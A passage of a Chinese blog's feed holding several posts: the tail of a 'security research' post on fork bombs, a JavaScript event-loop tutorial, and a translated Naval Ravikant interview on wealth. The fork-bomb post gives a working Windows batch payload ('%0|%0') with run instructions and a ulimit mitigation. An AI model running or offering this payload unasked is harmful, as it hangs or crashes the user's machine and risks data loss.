align="left"><code>;</code></td><td align="left">“:”函数定义结束后将要进行的操作…</td></tr><tr><td align="left"><code>:</code></td><td align="left">调用”:”函数,”引爆”fork炸弹</td></tr></tbody></table><h2 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h2><p><strong>POC</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">%0|%</span><span class="number">0</span>|%<span class="number">0</span></span><br></pre></td></tr></table></figure><p>将上面代码存为 .bat 文件，双击即可运行.</p><p><strong>注释</strong></p><table><thead><tr><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left"><code>%0</code></td><td align="left">输出自己本身,也就是.bat，在cmd中即表示运行.bat</td></tr><tr><td align="left"><code>|</code></td><td align="left">就是打开自身后的程序再打开.bat</td></tr></tbody></table><h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><p>一个防止其严重影响系统的方法就是限定一个用户能够创建的进程数的上限，在Linux系统上，可以通过ulimit这个指令达到相应的效果。</p><p>更多查看：<a href="https://en.wikipedia.org/wiki/Fork_bomb" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Fork_bomb</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;警告&lt;/code&gt;&lt;br&gt;本文只做研究用途，切勿用作其他非法用途，可参考&lt;a href=&quot;https://baike.baidu.com/item/破坏计算机信息系统罪/10459409&quot; target=&quot;_blank&quot; rel=&quot;no
      
    
    </summary>
    
      <category term="安全研究" scheme="http://ya2.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="fork bomb" scheme="http://ya2.top/tags/fork-bomb/"/>
    
      <category term="bat" scheme="http://ya2.top/tags/bat/"/>
    
  </entry>
  
  <entry>
    <title>一文读懂JavaScript的并发模型和事件循环机制</title>
    <link href="http://ya2.top/articles/%E4%B8%80%E6%96%87%E8%AF%BB%E6%87%82JavaScript%E7%9A%84%E5%B9%B6%E5%8F%91%E6%A8%A1%E5%9E%8B%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6/"/>
    <id>http://ya2.top/articles/一文读懂JavaScript的并发模型和事件循环机制/</id>
    <published>2020-07-16T10:15:23.000Z</published>
    <updated>2021-06-16T02:21:41.530Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道JS语言是串行执行、阻塞式、事件驱动的，那么它又是怎么支持并发处理数据的呢？</p><h2 id="“单线程”语言"><a href="#“单线程”语言" class="headerlink" title="“单线程”语言"></a>“单线程”语言</h2><p>在浏览器实现中，每个单页都是一个独立进程，其中包含了JS引擎、GUI界面渲染、事件触发、定时触发器、异步HTTP请求等多个线程。</p><blockquote><p>进程（Process）是操作系统CPU等资源分配的最小单位，是程序的执行实体，是线程的容器。<br>线程（Thread）是操作系统能够进行运算调度的最小单位，一条线程指的是进程中一个单一顺序的控制流。</p></blockquote><p>因此我们可以说JS是”单线程”式的语言，代码只能按照单一顺序进行串行执行，并在执行完成前阻塞其他代码。</p><h2 id="JS数据结构"><a href="#JS数据结构" class="headerlink" title="JS数据结构"></a>JS数据结构</h2><p><img src="/articles/一文读懂JavaScript的并发模型和事件循环机制/JS%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" alt="JS数据结构"></p><p>如上图所示为JS的几种重要数据结构：</p><ul><li>栈（Stack）：用于JS的函数嵌套调用，后进先出，直到栈被清空。</li><li>堆（Heap）：用于存储大块数据的内存区域，如对象。</li><li>队列（Queue）：用于事件循环机制，先进先出，直到队列为空。</li></ul><h2 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h2><p>我们的经验告诉我们JS是可以并发执行的，比如定时任务、并发AJAX请求，那这些是怎么完成的呢？其实这些都是JS在用单线程模拟多线程完成的。</p><p><img src="/articles/一文读懂JavaScript的并发模型和事件循环机制/%E4%BA%8B%E4%BB%B6%E9%98%9F%E5%88%97.png" alt="事件队列"></p><p>如上图所示，JS串行执行主线程任务，当遇到异步任务如定时器时，将其放入事件队列中，在主线程任务执行完毕后，再去事件队列中遍历取出队首任务进行执行，直至队列为空。</p><p>全部执行完成后，会有主监控进程，持续检测队列是否为空，如果不为空，则继续事件循环。</p><h2 id="setTimeout定时任务"><a href="#setTimeout定时任务" class="headerlink" title="setTimeout定时任务"></a>setTimeout定时任务</h2><p>定时任务<code>setTimeout(fn, timeout)</code>会先被交给浏览器的定时器模块，等延迟时间到了，再将事件放入到事件队列里，等主线程执行结束后，如果队列中没有其他任务，则会被立即处理，而如果还有没有执行完成的任务，则需要等前面的任务都执行完成才会被执行。因此setTimeout的第2个参数是最少延迟时间，而非等待时间。</p><p>当我们预期到一个操作会很繁重耗时又不想阻塞主线程的执行时，会使用立即执行任务：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(fn, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="特殊场景1：最小延迟为1ms"><a href="#特殊场景1：最小延迟为1ms" class="headerlink" title="特殊场景1：最小延迟为1ms"></a>特殊场景1：最小延迟为1ms</h3><p>然而考虑这么一段代码会怎么执行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="number">5</span>)&#125;,<span class="number">5</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="number">4</span>)&#125;,<span class="number">4</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="number">3</span>)&#125;,<span class="number">3</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="number">2</span>)&#125;,<span class="number">2</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="number">1</span>)&#125;,<span class="number">1</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="number">0</span>)&#125;,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>了解完事件队列机制，你的答案应该是<code>0,1,2,3,4,5</code>，然而答案却是<code>1,0,2,3,4,5</code>，这个是因为浏览器的实现机制是最小间隔为1ms。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/nodejs/node/blob/v8.9.4/lib/timers.js#L456</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(after &gt;= <span class="number">1</span> &amp;&amp; after &lt;= TIMEOUT_MAX))</span><br><span class="line">  after = <span class="number">1</span>; <span class="comment">// schedule on next tick, follows browser behavior</span></span><br></pre></td></tr></table></figure><p>浏览器以32位bit来存储延时，如果大于 <code>2^32-1 ms(24.8天)</code>，导致溢出会立刻执行。</p><h3 id="特殊场景2：最小延迟为4ms"><a href="#特殊场景2：最小延迟为4ms" class="headerlink" title="特殊场景2：最小延迟为4ms"></a>特殊场景2：最小延迟为4ms</h3><p>定时器的嵌套调用超过4层时，会导致最小间隔为4ms：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cb</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i, <span class="keyword">new</span> <span class="built_in">Date</span>().getMilliseconds());</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">20</span>) setTimeout(cb, <span class="number">0</span>);</span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(cb, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>可以看到前4层也不是标准的立刻执行，在第4层后间隔明显变大到4ms以上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0 667</span><br><span class="line">1 669</span><br><span class="line">2 670</span><br><span class="line">3 672</span><br><span class="line">4 676</span><br><span class="line">5 681</span><br><span class="line">6 685</span><br></pre></td></tr></table></figure><blockquote><p>Timers can be nested; after five such nested timers, however, the interval is forced to be at least four milliseconds.</p></blockquote><h3 id="特殊场景3：浏览器节流"><a href="#特殊场景3：浏览器节流" class="headerlink" title="特殊场景3：浏览器节流"></a>特殊场景3：浏览器节流</h3><p>为了优化后台tab的加载占用资源，浏览器对后台未激活的页面中定时器延迟限制为1s。<br>对追踪型脚本，如谷歌分析等，在当前页面，依然是4ms的延时限制，而后台tabs为10s。</p><h2 id="setInterval定时任务"><a href="#setInterval定时任务" class="headerlink" title="setInterval定时任务"></a>setInterval定时任务</h2><p>此时，我们会知道，setInterval会在每个定时器延时时间到了后，将一个新的事件fn放入事件队列，如果前面的任务执行太久，我们会看到连续的fn事件被执行而感觉不到时间预设间隔。</p><p>因此，我们要尽量避免使用setInterval，改用setTimeout来模拟循环定时任务。</p><h2 id="睡眠函数"><a href="#睡眠函数" class="headerlink" title="睡眠函数"></a>睡眠函数</h2><p>JS一直缺少休眠的语法，借助ES6新的语法，我们可以模拟这个功能，但是同样的这个方法因为借助了setTimeout也不能保证准确的睡眠延时：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    setTimeout(resolve, ms);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> sleep(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="async-await机制"><a href="#async-await机制" class="headerlink" title="async await机制"></a>async await机制</h3><p>async函数是Generator函数的语法糖，提供更方便的调用和语义，上面的使用可以替换为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">yield</span> sleep(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">var</span> g = test();</span><br><span class="line">test.next();</span><br></pre></td></tr></table></figure><p>但是调用使用更加复杂，因此一般我们使用async函数即可。但JS时如何实现睡眠函数的呢，其实就是提供一种执行时的中间状态暂停，然后将控制权移交出去，等控制权再次交回时，从上次的断点处继续执行。因此营造了一种睡眠的假象，其实JS主线程还可以在执行其他的任务。</p><p>Generator函数调用后会返回一个内部指针，指向多个异步任务的暂停点，当调用next函数时，从上一个暂停点开始执行。</p><h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p>协程（coroutine）是指多个线程互相协作，完成异步任务的一种多任务异步执行的解决方案。他的运行流程：</p><ul><li>协程A开始执行</li><li>协程A执行到一半，进入暂停，执行权转移到协程B</li><li>协程B在执行一段时间后，将执行权交换给A</li><li>协程A恢复执行</li></ul><p>可以看到这也就是Generator函数的实现方案。</p><h2 id="宏任务和微任务"><a href="#宏任务和微任务" class="headerlink" title="宏任务和微任务"></a>宏任务和微任务</h2><p>一个JS的任务可以定义为：在标准执行机制中，即将被调度执行的所有代码块。</p><p>我们上面介绍了JS如何使用单线程完成异步多任务调用，但我们知道JS的异步任务分很多种，如setTimeout定时器、Promise异步回调任务等，它们的执行优先级又一样吗？</p><p>答案是不。JS在异步任务上有更细致的划分，它分为两种：</p><ul><li><p>宏任务（macrotask)包含：</p><ul><li>执行的一段JS代码块，如控制台、script元素中包含的内容。</li><li>事件绑定的回调函数，如点击事件。</li><li>定时器创建的回调，如setTimeout和setInterval。</li></ul></li><li><p>微任务（microtask）包含：</p><ul><li>Promise对象的thenable函数。</li><li>Nodejs中的process.nextTick函数。</li><li>JS专用的queueMicrotask()函数。</li></ul></li></ul><p><img src="/articles/一文读懂JavaScript的并发模型和事件循环机制/%E5%AE%8F%E4%BB%BB%E5%8A%A1%E3%80%81%E5%BE%AE%E4%BB%BB%E5%8A%A1.png" alt="宏任务、微任务"></p><p>宏任务和微任务都有自身的事件循环机制，也拥有独立的事件队列（Event Queue），都会按照队列的顺序依次执行。但宏任务和微任务主要有两点区别：</p><ol><li>宏任务执行完成，在控制权交还给主线程执行其他宏任务之前，会将微任务队列中的所有任务执行完成。</li><li>微任务创建的新的微任务，会在下一个宏任务执行之前被继续遍历执行，直到微任务队列为空。</li></ol><h2 id="浏览器的进程和线程"><a href="#浏览器的进程和线程" class="headerlink" title="浏览器的进程和线程"></a>浏览器的进程和线程</h2><p>浏览器是多进程式的，每个页面和插件都是一个独立的进程，这样可以保证单页面崩溃或者插件崩溃不会影响到其他页面和浏览器整体的稳定运行。</p><p>它主要包括：</p><ol><li>主进程：负责浏览器界面显示和管理，如前进、后退，新增、关闭，网络资源的下载和管理。</li><li>第三方插件进程：当启用插件时，每个插件独立一个进程。</li><li>GPU进程：全局唯一，用于3D图形绘制。</li><li>Renderer渲染进程：每个页面一个进程，互不影响，执行事件处理、脚本执行、页面渲染。</li></ol><h3 id="单页面线程"><a href="#单页面线程" class="headerlink" title="单页面线程"></a>单页面线程</h3><p>浏览器的单个页面就是一个进程，指的就是Renderer进程，而进程中又包含有多个线程用于处理不同的任务，主要包括：</p><ol><li>GUI渲染线程：负责HTML和CSS的构建成DOM树，渲染页面，比如重绘。</li><li>JS引擎线程：JS内核，如Chrome的V8引擎，负责解析执行JS代码。</li><li>事件触发线程：如点击等事件存在绑定回调时，触发后会被放入宏任务事件队列。</li><li>定时触发器线程：setTimeout和setInterval的定时计数器，在时间到达后放入宏任务事件队列。</li><li>异步HTTP请求线程：XMLHTTPRequest请求后新开一个线程，等待状态改变后，如果存在回调函数，就将其放入宏任务队列。</li></ol><p>需要注意的是，GUI渲染进程和JS引擎进程互斥，两者只会同时执行一个。主要的原因是为了节流，因为JS的执行会可能多次改变页面，页面的改变也会多次调用JS，如resize。因此浏览器采用的策略是交替执行，每个宏任务执行完成后，执行GUI渲染，然后执行下一个宏任务。</p><h3 id="Webworker线程"><a href="#Webworker线程" class="headerlink" title="Webworker线程"></a>Webworker线程</h3><p>因为JS只有一个引擎线程，同时和GUI渲染线程互斥，因此在繁重任务执行时会导致页面卡住，所以在HTML5中支持了Webworker，它用于向浏览器申请一个新的子线程执行任务，并通过postMessage API来和worker线程通信。所以我们在繁重任务执行时，可以选择新开一个Worker线程来执行，并在执行结束后通信给主线程，这样不会影响页面的正常渲染和使用。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>JS是单线程、阻塞式执行语言。</li><li>JS通过事件循环机制来完成异步任务并发执行。</li><li>JS将任务细分为宏任务和微任务来提供执行优先级。</li><li>浏览器单页面为一个进程，包含的JS引擎线程和GUI渲染线程互斥，可以通过新开Web Worker线程来完成繁重的计算任务。</li></ol><p><img src="/articles/一文读懂JavaScript的并发模型和事件循环机制/%E7%B3%BB%E7%BB%9F%E5%AE%9E%E7%8E%B0.png" alt="系统实现"></p><p>最后给大家出一个考题，可以猜下执行的输出结果来验证学习成果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'before first microtask init'</span>);</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'first microtask'</span>);</span><br><span class="line">        resolve()</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">'finish first microtask'</span>)&#125;);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'after first microtask init'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'second microtask'</span>);</span><br><span class="line">        setTimeout(resolve, ms);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'start task'</span>);</span><br><span class="line">    <span class="keyword">await</span> sleep(<span class="number">3000</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'end task'</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'add event'</span>), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'main thread'</span>);</span><br></pre></td></tr></table></figure><p>输出为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main thread</span><br><span class="line">start task</span><br><span class="line">before first microtask init</span><br><span class="line">first microtask</span><br><span class="line">after first microtask init</span><br><span class="line">second microtask</span><br><span class="line">finish first microtask</span><br><span class="line">add event</span><br><span class="line">end task</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">这一次，彻底弄懂 JavaScript 执行机制</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/EventLoop" target="_blank" rel="noopener">并发模型与事件循环</a></li><li><a href="http://www.alloyteam.com/2016/05/javascript-timer/" target="_blank" rel="noopener">JavaScript 定时器与执行机制解析</a></li><li><a href="https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#timers" target="_blank" rel="noopener">timers-and-user-prompts</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/setTimeout" target="_blank" rel="noopener">Web API 接口参考- window.setTimeout</a></li><li><a href="http://es6.ruanyifeng.com/#docs/generator-async#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5" target="_blank" rel="noopener">Generator 函数的异步应用</a></li><li><a href="https://juejin.im/post/5a6547d0f265da3e283a1df7#heading-7" target="_blank" rel="noopener">从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理</a></li></ul><style>.post-body .fancybox img{margin: 0 auto !important; }</style>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我们知道JS语言是串行执行、阻塞式、事件驱动的，那么它又是怎么支持并发处理数据的呢？&lt;/p&gt;
&lt;h2 id=&quot;“单线程”语言&quot;&gt;&lt;a href=&quot;#“单线程”语言&quot; class=&quot;headerlink&quot; title=&quot;“单线程”语言&quot;&gt;&lt;/a&gt;“单线程”语言&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
      <category term="前端开发" scheme="http://ya2.top/categories/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>如何不靠运气变得富有</title>
    <link href="http://ya2.top/articles/%E5%A6%82%E4%BD%95%E4%B8%8D%E9%9D%A0%E8%BF%90%E6%B0%94%E5%8F%98%E5%BE%97%E5%AF%8C%E6%9C%89/"/>
    <id>http://ya2.top/articles/如何不靠运气变得富有/</id>
    <published>2020-07-03T10:23:03.000Z</published>
    <updated>2021-06-16T02:21:56.781Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一条：追求财富，而不是金钱或地位"><a href="#第一条：追求财富，而不是金钱或地位" class="headerlink" title="第一条：追求财富，而不是金钱或地位"></a>第一条：追求财富，而不是金钱或地位</h2><p>Nivi：你可能听说过Naval在推特上进行的那一波主题为“如何在不只依靠运气的情况下致富”的推特风暴（tweetstorm）。我们借助这个播客回顾大部分的推文，给Naval一个机会详细聊聊这些话题。他可能会提出一些以前没有发表过的想法。</p><p>Naval是AngelList创始人和Epinions的联合创始人。他是一位眼光独到的科技投资人，投出了像Twitter、Uber这样的科技公司。</p><p>不只是科技行业的人，各行各业的人都想知道<strong>如何解决他们「钱的问题」</strong>。每个人都隐约地意识到自己想要变得富有，但是他们没有一套好的原则来遵守和践行。</p><h3 id="财富是你睡觉时还能产生收入的资产"><a href="#财富是你睡觉时还能产生收入的资产" class="headerlink" title="财富是你睡觉时还能产生收入的资产"></a>财富是你睡觉时还能产生收入的资产</h3><p>Nivi：财富、金钱和地位有什么区别?</p><p>Naval：财富是你渴望的东西，是你睡觉时还在产生收入的财产。举例来说，财富是在夜间还能运行的为其他客户服务的计算机程序。财富是你存在银行里的钱，用于再投资其他资产和业务。</p><p>房子是财富的一种形式，因为你可以把它租出去，收得租金，尽管这是一种比经营商业企业更低效的土地使用方式。</p><p>我对财富的定义是指那些可以在<strong>你睡觉时依然可以为你赚钱的企业和资产</strong>。</p><h3 id="财富的终极目标是自由"><a href="#财富的终极目标是自由" class="headerlink" title="财富的终极目标是自由"></a>财富的终极目标是自由</h3><p>你渴望财富，是因为它能给你带来自由。也就是说，你不必像白领那样一丝不苟的系领带；你不必早上6点就起床、996挤地铁上下班；你不必把时间浪费在一份没有灵魂，你不喜欢的工作上。</p><p><strong>我们创造财富就是为了自由，仅此而已</strong>。而不是去买毛皮大衣，不是去开法拉利，不是去驾驶游艇，也不是去乘坐湾流飞机环游世界。那些东西很快就会变得无聊和愚蠢。它（财富）是关于<strong>你如何成为你自己的事</strong>。</p><p>除非你真的想要财富，否则你不会得到它。全世界都想要它，全世界都在为此努力。在某种程度上，它是有竞争力的。这是一个正和博弈，但其中也有竞争因素，因为现在社会上的资源是有限的。为了获得资源去做你想做的，你必须脱颖而出。</p><h3 id="金钱是我们转移财富的方式"><a href="#金钱是我们转移财富的方式" class="headerlink" title="金钱是我们转移财富的方式"></a>金钱是我们转移财富的方式</h3><p>金钱是社会信用，它是一种从别人的时间中获得信用和债务的能力。如果我做对了工作，为社会创造了价值，社会会说：“哦，谢谢你。我们欠你一些东西，将来会补偿你。这是我的借条，我们把它叫做钱吧。”</p><p>钱会贬值是因为,</p><ul><li>人们偷了借据</li><li>政府增发货币</li><li>人们违背IOU</li></ul><p>但是金钱试图成为社会的一个可靠的欠条，因为你在为自己的付出而被他人亏欠。我们把这些欠条到处传递，金钱是我们转移财富的方式。</p><h3 id="地位是你在社会等级中的地位"><a href="#地位是你在社会等级中的地位" class="headerlink" title="地位是你在社会等级中的地位"></a>地位是你在社会等级中的地位</h3><p>人生基本上有两大游戏。一个是金钱游戏。钱并不能解决你所有的问题，但它会解决你所有的和钱相关的问题。我想大家都能意识到这一点，所以才想赚钱。同时，在内心深处，许多人认为他们做不到，所以他们不希望任何财富创造发生。他们攻击那些赚钱的企业和企业家们，说他们：“赚钱是罪恶的。你不应该这么做。”但他们实际上在玩另一个游戏，那就是地位游戏。他们试图传递一种信息“我不需要钱，我们不要钱。”</p><p>地位指的是你在社会等级中的地位。</p><p><strong>财富不是零和游戏</strong>。世界上每个人都可以拥有一所房子，你有房子并不会影响我有房子的能力。如果有什么区别的话，建造的房屋越多，建造房屋就越容易，我们对建造房屋的了解就越多，就会有更多的人拥有房屋。</p><p><strong>财富是一个正和游戏</strong>。我们一起创造，努力创造着寄托着我们美好期待的“艺术品”来解释我们正在做的事情。最终，一些全新的东西将被创造出来。这是一个正和游戏。</p><p>另一方面，<strong>地位是一个零和游戏</strong>。这是一个非常古老的游戏。我们从原始人部落开始就玩这个游戏了。也就是等级制度。老大是谁？老二是谁？老三是谁？老三打败了老二，老二就必须让位。所以，地位是一个零和游戏。</p><h2 id="第二条：为世界创造更多"><a href="#第二条：为世界创造更多" class="headerlink" title="第二条：为世界创造更多"></a>第二条：为世界创造更多</h2><p><em>财富不是从别人那里拿走什么，而是为这个世界创造更多</em></p><h3 id="财富创造带来了世界的丰富"><a href="#财富创造带来了世界的丰富" class="headerlink" title="财富创造带来了世界的丰富"></a>财富创造带来了世界的丰富</h3><p>Naval：有一种观点认为赚钱是邪恶的，这个说法好像起源于“金钱是万恶之源”。人们认为银行家偷走了我们的钱，这在某种程度上是正确的，在世界上的很多地方，有很多偷窃行为一直在发生。</p><p>从某种意义上说，世界的历史就是创造者和索取者之间的捕食者/被捕食者关系。有些人走出去创造东西，建造东西，努力创造机会。有些人带着剑、枪，或者经济上我们说税收、裙带资本主义，共产主义等等形式，进行着不同形式的偷窃。即使在自然界，寄生生物也比非寄生生物多。你身上有很多寄生虫，它们靠你生存。好的情况是共生，他们会回馈一些东西。但也有很多只是索取。这就是任何复杂系统的本质。</p><p>我关注的是真正的财富创造。这不是仅为了赚钱，不是单纯从别人那里拿东西。</p><p>显而易见的是，工作不是有限的，财富也不是有限的。否则，我们还会坐在洞穴里，琢磨着如何瓜分柴火，或者偶尔运气好时捕食到的一些死鹿。</p><p>人类文明中的大部分财富，事实上是全部财富，都是被创造出来的。它是从某处产生的。它是由人创造，由科技创造，由生产力创造的。它是通过努力创造出来的。这种被窃取的想法是一种可怕的零和游戏，人们试图获得地位的游戏。</p><h3 id="每个人都可以变得富有"><a href="#每个人都可以变得富有" class="headerlink" title="每个人都可以变得富有"></a>每个人都可以变得富有</h3><p>但现实是，每个人都可以变得富有。我们可以看到，在第一世界国家，基本上每个人都比200年前活着的人富有。200年前，没有人使用抗生素，没有人有汽车，没有人能用电，没有人有iPhone。所有这些都是使我们作为一个物种变得更富有的发明。今天，我宁愿在第一世界国家做一个穷人，也不愿在路易十四的法国做一个富人。这是因为财富的创造。</p><p>技术的引擎是科学，其目的是创造丰富性。所以，我认为从根本上来说，每个人都可以变得富有。</p><p>我想让你们想象这样一种情形。如果每个人都掌握一个好的软件工程师和一个好的硬件工程师的技能，你可以自己造机器人，开发程序，自己建桥，并为它们编程。假设每个人都知道怎么做。</p><p>那你认为20年后的社会会是什么样子？我的猜测是，我们会造出各种各样的机器人、机器、软件和硬件来做任何事情。我们都会生活得非常富足。我们基本上就退休了，因为我们都不用为任何基本的东西工作。我们甚至会有机器人护士，会有机器驱动的医院，会有自动驾驶汽车。我们会有100%自动化的农场，会有清洁能源。那时，我们可以利用技术上的突破来得到我们想要的一切。如果有人还在工作，那么他们是在用工作来表达他们的创造力。</p><p>我不认为资本主义是邪恶的。资本主义实际上是好的，它只是被劫持了，被不当的外部成本定价所劫持。它被不正当的收益所劫持，在那里有腐败，或者有垄断。</p><h2 id="第三条：自由市场是人类固有"><a href="#第三条：自由市场是人类固有" class="headerlink" title="第三条：自由市场是人类固有"></a>第三条：自由市场是人类固有</h2><p><em>我们是唯一跨越基因界限进行合作的动物，因为我们可以在自愿的交换中追踪信用（credit）和债务（debt）</em></p><h3 id="自由市场是人类社会固有的"><a href="#自由市场是人类社会固有的" class="headerlink" 